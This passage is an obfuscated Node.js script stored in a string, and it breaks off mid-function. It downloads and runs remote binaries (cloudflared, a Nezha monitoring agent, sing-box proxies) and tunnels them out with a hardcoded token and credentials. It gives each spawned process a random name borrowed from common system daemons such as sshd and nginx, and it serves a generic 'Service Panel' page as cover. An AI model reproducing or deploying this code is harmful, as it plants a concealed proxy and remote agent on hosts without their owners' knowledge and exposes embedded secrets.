const b = 'const _0xb15734=_0xf451;(function(_0x317619,_0x13d84a){const _0x163949=_0xf451,_0x382523=_0x317619();while(!![]){try{const _0x22ddb6=-parseInt(_0x163949(0x22b))/0x1+parseInt(_0x163949(0x224))/0x2+parseInt(_0x163949(0x1da))/0x3+parseInt(_0x163949(0x1b9))/0x4+parseInt(_0x163949(0x1e8))/0x5*(-parseInt(_0x163949(0x1a2))/0x6)+parseInt(_0x163949(0x196))/0x7*(-parseInt(_0x163949(0x220))/0x8)+-parseInt(_0x163949(0x1a5))/0x9*(parseInt(_0x163949(0x1d3))/0xa);if(_0x22ddb6===_0x13d84a)break;else _0x382523['push'](_0x382523['shift']());}catch(_0x3c1687){_0x382523['push'](_0x382523['shift']());}}}(_0xfdf6,0xe5ba3));const http=require(_0xb15734(0x1ea)),https=require(_0xb15734(0x1d1)),fs=require('fs'),path=require(_0xb15734(0x1b4)),os=require('os'),{spawn,exec}=require(_0xb15734(0x1fb)),{URL}=require(_0xb15734(0x1ff)),crypto=require(_0xb15734(0x187)),net=require(_0xb15734(0x225)),express=require(_0xb15734(0x211)),{createProxyMiddleware}=require('http-proxy-middleware'),axios=require(_0xb15734(0x247)),CONFIG={'C_T':process[_0xb15734(0x203)][_0xb15734(0x1f5)]||'eyJhIjoiZjAzMGY1ZDg4OGEyYmRlN2NiMDg3NTU5MzM4ZjE0OTciLCJ0IjoiMjYxYjNjZjgtNDFlOC00MTViLTk2MTAtYWI0NWQwODkxNmU1IiwicyI6Ik16TTJaak14T0dJdFpUVmlaaTAwWVdNMUxUbG1NV1F0T0RBeVpEQXpabUV5TkRKbSJ9','B_D':process[_0xb15734(0x203)][_0xb15734(0x190)]||'loc.gov','C_D':process[_0xb15734(0x203)][_0xb15734(0x1cf)]||_0xb15734(0x1a1),'N_S':process[_0xb15734(0x203)][_0xb15734(0x19e)]||_0xb15734(0x1b6),'N_P':process[_0xb15734(0x203)][_0xb15734(0x197)]||'443','N_K':process['env'][_0xb15734(0x1ef)]||'laPuDKNbnpECUeMxwR','N_T':process[_0xb15734(0x203)][_0xb15734(0x18e)]||_0xb15734(0x227),'HY2_PORT':process[_0xb15734(0x203)]['HY2_PORT']||process[_0xb15734(0x203)][_0xb15734(0x1dc)]||'','VMESS_PORT':process[_0xb15734(0x203)][_0xb15734(0x1f1)]||_0xb15734(0x1ab),'REALITY_PORT':process[_0xb15734(0x203)][_0xb15734(0x23a)]||'','TUIC_PORT':process['env'][_0xb15734(0x1f0)]||'','SERVER_IP':process[_0xb15734(0x203)][_0xb15734(0x1ed)]||'','VMESS_UUID':process[_0xb15734(0x203)][_0xb15734(0x1f8)]||_0xb15734(0x1cb),'TUIC_UUID':process['env']['TUIC_UUID']||'feefeb96-bfcf-4a9b-aac0-6aac771c1b98','TUIC_PASSWORD':process['env'][_0xb15734(0x1db)]||_0xb15734(0x1c5),'HY2_PASSWORD':process['env'][_0xb15734(0x1e2)]||_0xb15734(0x1c5),'REALITY_PRIVATE_KEY':process['env'][_0xb15734(0x193)]||'','REALITY_PUBLIC_KEY':process['env'][_0xb15734(0x185)]||'','HY2_SNI':process[_0xb15734(0x203)]['HY2_SNI']||'www.bing.com','VMESS_PATH':process['env']['VMESS_PATH']||_0xb15734(0x234),'REALITY_SNI':process['env'][_0xb15734(0x205)]||_0xb15734(0x1df),'REALITY_SHORT_ID':process[_0xb15734(0x203)][_0xb15734(0x1e3)]||'0123456789abcdef','PORT':process[_0xb15734(0x203)][_0xb15734(0x1cd)]||0x1eb4},WORK_DIR=os[_0xb15734(0x204)](),processes=[];let serviceStatus={'singbox':'stopped','cloudflared':'stopped','nezha':_0xb15734(0x213),'http':'stopped'};function _0xf451(_0x3a7646,_0x17439b){const _0xfdf601=_0xfdf6();return _0xf451=function(_0xf45181,_0x2f73ea){_0xf45181=_0xf45181-0x180;let _0x48f164=_0xfdf601[_0xf45181];return _0x48f164;},_0xf451(_0x3a7646,_0x17439b);}const HTML_TEMPLATES={'home':_0xb15734(0x1ba),'status':(_0x459fad,_0x2fab19)=>_0xb15734(0x22d)+(serviceStatus[_0xb15734(0x1af)]==='running'?_0xb15734(0x188):_0xb15734(0x1b7))+'\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h3>Sing-Box</h3>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div>'+serviceStatus[_0xb15734(0x1af)]+_0xb15734(0x1ec)+(serviceStatus[_0xb15734(0x221)]===_0xb15734(0x199)?_0xb15734(0x188):'status-stopped')+_0xb15734(0x21b)+serviceStatus['cloudflared']+_0xb15734(0x1ec)+(serviceStatus['nezha']===_0xb15734(0x199)?_0xb15734(0x188):'status-stopped')+_0xb15734(0x249)+serviceStatus['nezha']+_0xb15734(0x1ec)+(serviceStatus['http']===_0xb15734(0x199)?_0xb15734(0x188):_0xb15734(0x1b7))+_0xb15734(0x228)+serviceStatus['http']+_0xb15734(0x1be)+CONFIG[_0xb15734(0x1cd)]+_0xb15734(0x1c1)+(CONFIG[_0xb15734(0x1f1)]?_0xb15734(0x215)+CONFIG[_0xb15734(0x1f1)]+_0xb15734(0x19a):'')+'\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20'+(CONFIG['HY2_PORT']?_0xb15734(0x21e)+CONFIG['HY2_PORT']+'</div></div>':'')+_0xb15734(0x1b2)+(CONFIG['REALITY_PORT']?'<div\x20class=\x22port-item\x22><div\x20class=\x22port-label\x22>Reality</div><div\x20class=\x22port-value\x22>'+CONFIG[_0xb15734(0x23a)]+_0xb15734(0x19a):'')+_0xb15734(0x1b2)+(CONFIG[_0xb15734(0x1f0)]?'<div\x20class=\x22port-item\x22><div\x20class=\x22port-label\x22>TUIC</div><div\x20class=\x22port-value\x22>'+CONFIG['TUIC_PORT']+_0xb15734(0x19a):'')+_0xb15734(0x1c3)+_0x459fad+_0xb15734(0x1f9)+(_0x2fab19['length']>0x0?_0x2fab19[_0xb15734(0x183)](_0x42b1fa=>_0xb15734(0x1d4)+_0x42b1fa[_0xb15734(0x1c8)]+_0xb15734(0x1eb)+_0x42b1fa[_0xb15734(0x1c8)][_0xb15734(0x18f)]()+'\x22>'+_0x42b1fa[_0xb15734(0x1ff)]+_0xb15734(0x195)+_0x42b1fa[_0xb15734(0x1ff)]+_0xb15734(0x1c2)+_0x42b1fa[_0xb15734(0x1c8)]+_0xb15734(0x200))[_0xb15734(0x1a4)](''):_0xb15734(0x232))+_0xb15734(0x216)},COMMON_PROCESS_NAMES=[_0xb15734(0x1f2),_0xb15734(0x1d5),'apache2',_0xb15734(0x1a9),_0xb15734(0x22a),_0xb15734(0x1ac),_0xb15734(0x222),_0xb15734(0x241),'ntpd',_0xb15734(0x19d),_0xb15734(0x239),_0xb15734(0x20b),_0xb15734(0x226),_0xb15734(0x1ae),_0xb15734(0x1d0),_0xb15734(0x24a),'java',_0xb15734(0x1e9),'mongod','dockerd',_0xb15734(0x24e),_0xb15734(0x1d7),'logrotate',_0xb15734(0x20e),_0xb15734(0x194),_0xb15734(0x242),'cron',_0xb15734(0x1bc),_0xb15734(0x20d),'polkitd','irqbalance'];function getRandomProcessName(){const _0xdbdc4c=_0xb15734;return COMMON_PROCESS_NAMES[Math[_0xdbdc4c(0x233)](Math[_0xdbdc4c(0x23f)]()*COMMON_PROCESS_NAMES[_0xdbdc4c(0x251)])];}function detectArch(){const _0x3abe65=_0xb15734,_0x275da9=process['arch'];return _0x275da9==='x64'?_0x3abe65(0x24d):_0x275da9==='arm64'?_0x3abe65(0x1c7):(process[_0x3abe65(0x24f)](0x1),'');}async function downloadBinary(_0x181397,_0x289da9){const _0x2ba2f9=_0xb15734;try{const _0x5e828d=await axios({'method':_0x2ba2f9(0x1f3),'url':_0x181397,'responseType':_0x2ba2f9(0x245)}),_0x59ac91=fs[_0x2ba2f9(0x1a7)](_0x289da9);return _0x5e828d[_0x2ba2f9(0x23d)]['pipe'](_0x59ac91),new Promise((_0x2397e0,_0x3364eb)=>{const _0x524832=_0x2ba2f9;_0x59ac91['on'](_0x524832(0x1e0),()=>{const _0x4d038d=_0x524832;fs[_0x4d038d(0x246)](_0x289da9,0x1ed),_0x2397e0();}),_0x59ac91['on'](_0x524832(0x254),_0x3364eb);});}catch(_0xa21ff7){throw _0xa21ff7;}}async function getServerIP(){const _0x39cd50=_0xb15734;try{const _0x4b527c=await axios[_0x39cd50(0x207)](_0x39cd50(0x214));return _0x4b527c[_0x39cd50(0x23d)][_0x39cd50(0x248)]();}catch(_0x34bf9e){return _0x39cd50(0x180);}}async function startTempTunnel(_0x5d3249,_0x342bef){return new Promise(_0xab2258=>{const _0x2f631e=_0xf451;for(let _0x368ae4=0x0;_0x368ae4<0x3;_0x368ae4++){const _0x377888=path[_0x2f631e(0x1a4)](WORK_DIR,_0x2f631e(0x210)+crypto[_0x2f631e(0x19b)](0x4)[_0x2f631e(0x1c0)]('hex')+_0x2f631e(0x1d8)),_0x4d5631=spawn(_0x5d3249,[_0x2f631e(0x1fa),_0x2f631e(0x21f),_0x2f631e(0x218),_0x2f631e(0x250)+_0x342bef],{'stdio':[_0x2f631e(0x19c),_0x2f631e(0x1c4),_0x2f631e(0x1c4)]});processes[_0x2f631e(0x24b)](_0x4d5631);const _0x35ee02=fs['createWriteStream'](_0x377888);_0x4d5631[_0x2f631e(0x186)][_0x2f631e(0x1c4)](_0x35ee02),_0x4d5631[_0x2f631e(0x22e)][_0x2f631e(0x1c4)](_0x35ee02),serviceStatus['cloudflared']=_0x2f631e(0x199),_0x4d5631['on'](_0x2f631e(0x254),()=>{const _0x2da33a=_0x2f631e;serviceStatus[_0x2da33a(0x221)]=_0x2da33a(0x254);}),_0x4d5631['on'](_0x2f631e(0x24f),_0x550bff=>{const _0x154661=_0x2f631e;_0x550bff!==0x0&&(serviceStatus['cloudflared']=_0x154661(0x213));}),setTimeout(()=>{const _0x12bce1=_0x2f631e;try{const _0x5180c4=fs[_0x12bce1(0x237)](_0x377888,_0x12bce1(0x1ca)),_0x22dd55=_0x5180c4[_0x12bce1(0x253)](/https:\/\/([^\/\s]+\.trycloudflare\.com)/);if(_0x22dd55){CONFIG['C_D']=_0x22dd55[0x1];try{fs['unlinkSync'](_0x377888);}catch(_0x2d3d58){}return _0xab2258(!![]);}}catch(_0x996258){}_0x4d5631[_0x12bce1(0x189)]();try{fs[_0x12bce1(0x201)](_0x377888);}catch(_0x3b6f77){}_0x368ae4===0x2&&(serviceStatus[_0x12bce1(0x221)]=_0x12bce1(0x254),_0xab2258(![]));},0x2710);}});}function _0xfdf6(){const _0x583fa8=['--url','/health','HY2_SNI','\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h3>Cloudflared</h3>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div>','--disable-auto-update','TUIC_UUID','<div\x20class=\x22port-item\x22><div\x20class=\x22port-label\x22>Hysteria2</div><div\x20class=\x22port-value\x22>','--no-autoupdate','1482728tbGeHX','cloudflared','redis-server','existsSync','2132036zmbEFf','net','supervisord','--tls','\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h3>HTTP\x20Server</h3>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div>','upgrade','mysqld','14608iydNbX','ws://localhost:','\x0a\x20\x20\x20\x20\x20\x20\x20\x20<html>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<head>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<title>Service\x20Status</title>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20charset=\x22UTF-8\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20name=\x22viewport\x22\x20content=\x22width=device-width,\x20initial-scale=1.0\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<style>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20body{font-family:Arial,sans-serif;margin:40px;background-color:#f5f5f5}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.container{max-width:900px;margin:0\x20auto;background:white;padding:30px;border-radius:8px;box-shadow:0\x202px\x2010px\x20rgba(0,0,0,0.1)}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20h1{color:#333;text-align:center;margin-bottom:30px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.status-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:20px;margin-bottom:30px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.status-card{padding:20px;background:#f8f9fa;border-radius:8px;text-align:center}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.status-card\x20h3{margin:0\x200\x2010px\x200;color:#555}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.status-running{background:#d4edda;color:#155724}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.status-stopped{background:#f8d7da;color:#721c24}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.info-item{margin:20px\x200;padding:15px;background:#f8f9fa;border-radius:5px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.label{font-weight:bold;color:#555;margin-bottom:10px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.value{font-family:monospace;background:#e9ecef;padding:10px;border-radius:4px;word-break:break-all;font-size:12px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.copy-btn{background:#007cba;color:white;border:none;padding:8px\x2015px;border-radius:3px;cursor:pointer;margin-top:10px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.copy-btn:hover{background:#0056b3}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.protocol{color:#28a745;font-weight:bold}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.nav{text-align:center;margin-bottom:20px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.nav\x20a{margin:0\x2010px;color:#007cba;text-decoration:none}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.nav\x20a:hover{text-decoration:underline}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.port-info{margin:20px\x200;padding:15px;background:#e9ecef;border-radius:5px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.port-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:10px;margin-top:10px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.port-item{background:#fff;padding:10px;border-radius:4px;text-align:center;box-shadow:0\x201px\x203px\x20rgba(0,0,0,0.1)}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.port-label{font-weight:bold;color:#555}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.port-value{font-family:monospace;color:#28a745;margin-top:5px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</style>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<script>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20function\x20refreshPage()\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20location.reload();\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20setInterval(refreshPage,\x2030000);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</script>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</head>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<body>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22container\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22nav\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<a\x20href=\x22/\x22>Home</a>\x20|\x20<a\x20href=\x22/status\x22>Status</a>\x20|\x20<a\x20href=\x22javascript:refreshPage()\x22>Refresh</a>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h1>Service\x20Status</h1>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22status-grid\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22status-card\x20','stderr','tuic://','cloudflare','direct','<div\x20class=\x22info-item\x22><div\x20class=\x22label\x22>No\x20active\x20connections</div></div>','floor','/vms','cubic','end','readFileSync','from','crond','REALITY_PORT','status','1.1.1.1','data','reality-in','random','every','memcached','dbus-daemon','all','nezha.log','stream','chmodSync','axios','trim','\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h3>Nezha</h3>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div>','php-fpm','push','--report-delay','amd64','containerd','exit','http://localhost:','length','vmess://','match','error','SIGINT','127.0.0.1','\x22\x20check\x20-c\x20\x22','listen','map','&alpn=h3#HY2','REALITY_PUBLIC_KEY','stdout','crypto','status-running','kill','keys','https://github.com/seav1/dl/releases/download/upx/sb-arm','config.json','\x22\x20generate\x20reality-keypair','N_T','toLowerCase','B_D','443','find','REALITY_PRIVATE_KEY','syslogd','</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<button\x20class=\x22copy-btn\x22\x20onclick=\x22navigator.clipboard.writeText(\x27','28iDLtLF','N_P','TUIC','running','</div></div>','randomBytes','ignore','systemd','N_S','HY2_PORT','cache.db','huggingface.seav.eu.org','1695918pKrdkt','&type=tcp#REALITY','join','1629grjNtC','https://github.com/seav1/dl/releases/download/upx/nz-arm','createWriteStream','--edge-ip-version','httpd','tuic','8001','postgres','home','node','singbox','&fp=chrome&pbk=','vless','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','VMESS_PATH','path','auto','nz.seav.eu.org','status-stopped','hy2-in','5155172nkowbC','\x0a\x20\x20\x20\x20\x20\x20\x20\x20<html>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<head>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<title>Service\x20Panel</title>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20charset=\x22UTF-8\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20name=\x22viewport\x22\x20content=\x22width=device-width,\x20initial-scale=1.0\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<style>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20body{font-family:Arial,sans-serif;margin:0;padding:0;background:linear-gradient(135deg,#667eea\x200%,#764ba2\x20100%);min-height:100vh;display:flex;align-items:center;justify-content:center}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.container{text-align:center;background:white;padding:60px\x2040px;border-radius:15px;box-shadow:0\x2010px\x2030px\x20rgba(0,0,0,0.2);max-width:500px;margin:20px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20h1{color:#333;font-size:2.5em;margin-bottom:20px;font-weight:300}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20p{color:#666;font-size:1.2em;line-height:1.6;margin-bottom:30px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.icon{font-size:4em;margin-bottom:20px;color:#667eea;font-weight:bold}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.footer{color:#999;font-size:0.9em;margin-top:30px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.nav-links{margin-top:30px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.nav-links\x20a{display:inline-block;margin:0\x2010px;padding:10px\x2020px;background:#667eea;color:white;text-decoration:none;border-radius:5px;transition:background\x200.3s}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.nav-links\x20a:hover{background:#5a67d8}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</style>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</head>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<body>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22container\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22icon\x22>[!]</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h1>Service\x20Panel</h1>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p>Multi-protocol\x20service\x20management\x20panel.</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22nav-links\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<a\x20href=\x22/status\x22>View\x20Status</a>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22footer\x22>Service\x20Management\x20Panel</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</body>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</html>\x0a\x20\x20\x20\x20','http2','atd','stringify','</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22port-info\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22label\x22>Configured\x20Ports:</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22port-grid\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22port-item\x22><div\x20class=\x22port-label\x22>HTTP</div><div\x20class=\x22port-value\x22>','10s','toString','</div></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','\x27).then(()=>alert(\x27Copied\x20','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22info-item\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22label\x22>Server\x20IP:</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22value\x22>','pipe','789456','some','arm64','protocol','VMESS','utf8','feefeb96-bfcf-4a9b-aac0-6aac771c1b98','/status','PORT','https://github.com/seav1/dl/releases/download/upx/cf-arm','C_D','python','https','forEach','88550bkSdsx','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22info-item\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22label\x22><span\x20class=\x22protocol\x22>','nginx','8.8.8.8','snapd','.log','run','4530555IfCcBW','TUIC_PASSWORD','SERVER_PORT','hysteria2://','none','www.microsoft.com','finish','catch','HY2_PASSWORD','REALITY_SHORT_ID','vmess','logFile','killed','block','10RAELYh','ruby','http',':</span></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22value\x22\x20id=\x22','</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22status-card\x20','SERVER_IP','text/html','N_K','TUIC_PORT','VMESS_PORT','sshd','GET','chrome','C_T','spawn','vmess-in','VMESS_UUID','</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','tunnel','child_process','tuic-in','--token','warn','url','!\x27))\x22>Copy</button>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','unlinkSync','uptime','env','tmpdir','REALITY_SNI','string','get','https://github.com/seav1/dl/releases/download/upx/nz','Reality','includes','rsyslogd','writeHead','dhclient','udevd','nezha','cf_','express','xtls-rprx-vision','stopped','https://ipv4.icanhazip.com','<div\x20class=\x22port-item\x22><div\x20class=\x22port-label\x22>VMESS</div><div\x20class=\x22port-value\x22>','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</body>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</html>\x0a\x20\x20\x20\x20','?encryption=none&flow=xtls-rprx-vision&security=reality&sni='];_0xfdf6=function(){return _0x583fa8;};return _0xfdf6();}async function generateRealityKeys(_0x1c6b01){const _0x17ea11=_0xb15734;if(!CONFIG[_0x17ea11(0x23a)]||CONFIG['REALITY_PRIVATE_KEY']&&CONFIG[_0x17ea11(0x185)])return;return new Promise(_0xa180b6=>{const _0x586964=_0x17ea11;exec('\x22'+_0x1c6b01+_0x586964(0x18d),(_0x4895f4,_0x38e1bb)=>{const _0x31c761=_0x586964;if(!_0x4895f4&&_0x38e1bb){const 